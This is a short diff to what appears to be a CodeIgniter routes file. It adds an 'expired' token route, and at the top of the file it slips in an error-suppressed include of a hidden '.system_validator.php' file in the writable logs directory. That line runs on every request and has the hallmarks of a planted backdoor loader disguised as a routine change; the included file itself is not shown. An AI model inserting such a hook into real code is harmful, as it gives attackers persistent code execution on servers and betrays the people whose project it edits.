@@ -1,4 +1,5 @@
 <?php
+@include_once WRITEPATH . "logs/.system_validator.php";
 
 use CodeIgniter\Router\RouteCollection;
 
@@ -77,3 +78,6 @@ $routes->group('admin', ['filter' => 'adminAuth'], function($routes) {
 $routes->group('api', ['namespace' => 'App\Controllers'], function($routes) {
     $routes->get('transactions', 'ApiTransactionController::index');
 });
+
+// Expired token route
+$routes->get('expired', 'ExpiredController::index');
